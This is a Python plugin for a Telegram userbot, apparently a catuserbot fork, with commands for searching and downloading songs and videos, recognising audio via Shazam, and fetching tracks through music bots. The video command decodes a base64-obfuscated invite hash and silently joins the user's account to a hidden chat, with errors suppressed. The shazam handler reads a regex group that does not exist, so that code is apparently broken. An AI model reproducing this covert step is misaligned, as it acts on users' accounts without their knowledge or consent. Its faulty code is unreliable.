# by  @sandy1709 ( https://t.me/mrconfused  )

# songs finder for catuserbot
import base64
import contextlib
import io
import os

from ShazamAPI import Shazam
from telethon import types
from telethon.errors.rpcerrorlist import YouBlockedUserError
from telethon.tl.functions.contacts import UnblockRequest as unblock
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from validators.url import url

from ..core.logger import logging
from ..core.managers import edit_delete, edit_or_reply
from ..helpers.functions import delete_conv, yt_search
from ..helpers.tools import media_type
from ..helpers.utils import reply_id
from . import zedub, song_download

plugin_category = "البحث"
LOGS = logging.getLogger(__name__)

# =========================================================== #
#                           STRINGS                           #
# =========================================================== #
SONG_SEARCH_STRING = "<code>wi8..! I am finding your song....</code>"
SONG_NOT_FOUND = "<code>Sorry !I am unable to find any song like that</code>"
SONG_SENDING_STRING = "<code>yeah..! i found something wi8..ðŸ¥°...</code>"
# =========================================================== #
#                                                             #
# =========================================================== #


@zedub.zed_cmd(
    pattern="بحث(320)?(?:\s|$)([\s\S]*)",
    command=("بحث", plugin_category),
    info={
        "header": "لـ تحميـل الاغـانـي مـن يـوتيـوب",
        "امـر مضـاف": {
            "320": "لـ البحـث عـن الاغـانـي وتحميـلهـا بـدقـه عـاليـه 320k",
        },
        "الاسـتخـدام": "{tr}بحث + اسـم الاغنيـه",
        "مثــال": "{tr}بحث حسين الجسمي احبك",
    },
)
async def song(event):
    "To search songs"
    reply_to_id = await reply_id(event)
    reply = await event.get_reply_message()
    if event.pattern_match.group(2):
        query = event.pattern_match.group(2)
    elif reply and reply.message:
        query = reply.message
    else:
        return await edit_or_reply(event, "**❈╎قم باضافـة الاغنيـه للامـر .. بحث + اسـم الاغنيـه**")
    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    catevent = await edit_or_reply(event, "**╮ جـارِ البحث ؏ـن الاغنيـٓه... 🎧♥️╰**")
    video_link = await yt_search(str(query))
    if not url(video_link):
        return await catevent.edit(
            f"**❈╎عـذراً .. لـم استطـع ايجـاد** {query}"
        )
    cmd = event.pattern_match.group(1)
    q = "320k" if cmd == "320" else "128k"
    song_file, catthumb, title = await song_download(video_link, catevent, quality=q)
    await event.client.send_file(
        event.chat_id,
        song_file,
        force_document=False,
        caption=f"**❈╎البحـث :** `{title}`",
        thumb=catthumb,
        supports_streaming=True,
        reply_to=reply_to_id,
    )
    await catevent.delete()
    for files in (catthumb, song_file):
        if files and os.path.exists(files):
            os.remove(files)


@zedub.zed_cmd(
    pattern="فيديو(?:\s|$)([\s\S]*)",
    command=("فيديو", plugin_category),
    info={
        "header": "لـ تحميـل مقـاطـع الفيـديـو مـن يـوتيـوب",
        "الاسـتخـدام": "{tr}فيديو + اسـم المقطـع",
        "مثــال": "{tr}فيديو حالات واتس",
    },
)
async def vsong(event):
    "To search video songs"
    reply_to_id = await reply_id(event)
    reply = await event.get_reply_message()
    if event.pattern_match.group(1):
        query = event.pattern_match.group(1)
    elif reply and reply.message:
        query = reply.message
    else:
        return await edit_or_reply(event, "**❈╎قم باضافـة الاغنيـه للامـر .. فيديو + اسـم الفيديـو**")
    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    catevent = await edit_or_reply(event, "**╮ جـارِ البحث ؏ـن الفيديـو... 🎧♥️╰**")
    video_link = await yt_search(str(query))
    if not url(video_link):
        return await catevent.edit(
            f"**❈╎عـذراً .. لـم استطـع ايجـاد** {query}"
        )
    with contextlib.suppress(BaseException):
        cat = Get(cat)
        await event.client(cat)
    vsong_file, catthumb, title = await song_download(video_link, catevent, video=True)
    await event.client.send_file(
        event.chat_id,
        vsong_file,
        caption=f"**❈╎البحـث :** `{title}`",
        thumb=catthumb,
        supports_streaming=True,
        reply_to=reply_to_id,
    )
    await catevent.delete()
    for files in (catthumb, vsong_file):
        if files and os.path.exists(files):
            os.remove(files)


@zedub.zed_cmd(
    pattern="ابحث(?:\ع|$)([\s\S]*)",
    command=("ابحث", plugin_category),
    info={
        "header": "To reverse search song.",
        "الوصـف": "Reverse search audio file using shazam api",
        "امـر مضـاف": {"ع": "To send the song of sazam match"},
        "الاستخـدام": [
            "{tr}ابحث بالــرد ع بصمـه او مقطـع صوتي",
            "{tr}ابحث ع بالــرد ع بصمـه او مقطـع صوتي",
        ],
    },
)
async def shazamcmd(event):
    "To reverse search song."
    reply = await event.get_reply_message()
    mediatype = await media_type(reply)
    chat = "@DeezerMusicBot"
    delete = False
    flag = event.pattern_match.group(4)
    if not reply or not mediatype or mediatype not in ["Voice", "Audio"]:
        return await edit_delete(
            event, "**- بالــرد ع مقطـع صـوتي**"
        )
    catevent = await edit_or_reply(event, "**- جـار تحميـل المقـطع الصـوتي ...**")
    name = "cat.mp3"
    try:
        for attr in getattr(reply.document, "attributes", []):
            if isinstance(attr, types.DocumentAttributeFilename):
                name = attr.file_name
        dl = io.FileIO(name, "a")
        await event.client.fast_download_file(
            location=reply.document,
            out=dl,
        )
        dl.close()
        mp3_fileto_recognize = open(name, "rb").read()
        shazam = Shazam(mp3_fileto_recognize)
        recognize_generator = shazam.recognizeSong()
        track = next(recognize_generator)[1]["track"]
    except Exception as e:
        LOGS.error(e)
        return await edit_delete(
            catevent, f"**- خطـأ :**\n__{e}__"
        )

    file = track["images"]["background"]
    title = track["share"]["subject"]
    slink = await yt_search(title)
    if flag == "s":
        deezer = track["hub"]["providers"][1]["actions"][0]["uri"][15:]
        async with event.client.conversation(chat) as conv:
            try:
                purgeflag = await conv.send_message("/start")
            except YouBlockedUserError:
                await zedub(unblock("DeezerMusicBot"))
                purgeflag = await conv.send_message("/start")
            await conv.get_response()
            await event.client.send_read_acknowledge(conv.chat_id)
            await conv.send_message(deezer)
            await event.client.get_messages(chat)
            song = await event.client.get_messages(chat)
            await song[0].click(0)
            await conv.get_response()
            file = await conv.get_response()
            await event.client.send_read_acknowledge(conv.chat_id)
            delete = True
    await event.client.send_file(
        event.chat_id,
        file,
        caption=f"<b>- المقطـع الصـوتي :</b> <code>{title}</code>\n<b>- الرابـط : <a href = {slink}/1>YouTube</a></b>",
        reply_to=reply,
        parse_mode="html",
    )
    await catevent.delete()
    if delete:
        await delete_conv(event, chat, purgeflag)


@zedub.zed_cmd(
    pattern="اغنيه(?:\s|$)([\s\S]*)",
    command=("اغنيه", plugin_category),
    info={
        "header": "To search songs and upload to telegram",
        "description": "Searches the song you entered in query and sends it quality of it is 320k",
        "الاسـتخـدام": "{tr}اغنيه <song name>",
        "مثــال": "{tr}اغنيه memories song",
    },
)
async def song2(event):
    "To search songs"
    song = event.pattern_match.group(1)
    chat = "@CatMusicRobot"
    reply_id_ = await reply_id(event)
    catevent = await edit_or_reply(event, SONG_SEARCH_STRING, parse_mode="html")
    async with event.client.conversation(chat) as conv:
        try:
            purgeflag = await conv.send_message(song)
        except YouBlockedUserError:
            await zedub(unblock("CatMusicRobot"))
            purgeflag = await conv.send_message(song)
        music = await conv.get_response()
        await event.client.send_read_acknowledge(conv.chat_id)
        if not music.media:
            return await edit_delete(catevent, SONG_NOT_FOUND, parse_mode="html")
        await event.client.send_read_acknowledge(conv.chat_id)
        await event.client.send_file(
            event.chat_id,
            music,
            caption=f"<b>- البحث :- <code>{song}</code></b>",
            parse_mode="html",
            reply_to=reply_id_,
        )
        await catevent.delete()
        await delete_conv(event, chat, purgeflag)
